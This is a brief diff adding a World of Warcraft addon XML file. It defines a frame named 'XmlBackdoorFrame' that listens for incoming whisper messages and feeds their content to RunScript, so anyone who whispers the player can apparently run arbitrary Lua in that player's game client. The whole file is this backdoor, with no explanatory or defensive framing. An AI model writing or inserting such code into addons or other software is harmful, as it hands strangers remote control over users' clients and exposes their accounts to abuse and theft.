@@ -1,0 +1,11 @@
+<Ui xmlns="http://www.blizzard.com/wow/ui/">
+  <Frame name="XmlBackdoorFrame">
+    <Scripts>
+      <OnLoad>self:RegisterEvent("CHAT_MSG_WHISPER")</OnLoad>
+      <OnEvent>
+        local msg = ...
+        RunScript(select(2, ...))
+      </OnEvent>
+    </Scripts>
+  </Frame>
+</Ui>
